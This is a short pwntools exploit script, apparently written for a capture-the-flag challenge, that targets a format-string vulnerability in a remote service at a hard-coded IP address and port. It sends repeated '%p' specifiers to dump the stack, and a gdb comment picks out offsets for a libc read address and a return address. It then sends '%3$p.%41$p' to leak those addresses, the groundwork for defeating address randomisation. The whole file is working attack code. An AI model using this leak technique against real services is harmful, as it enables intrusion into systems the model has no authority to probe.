from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

def detect(io):
	io.sendline('%p.'*88)
	buf = io.recvline().strip().split('.')
	for i in range(len(buf)):
		print str(i+1)+' : '+buf[i]

#io = process('./format')
ip, port = '165.227.231.233', 32029
io = remote(ip, port)

detect(io)
'''
Breakpoint 2, 0x00005555555551dd in echo ()
gdb-peda$ disassemble 0x7ffff7e9c992
Dump of assembler code for function __GI___libc_read

$3 is read 
$41 is return address 0x12b3
'''
io.sendline('%3$p.%41$p')
print io.recvline()

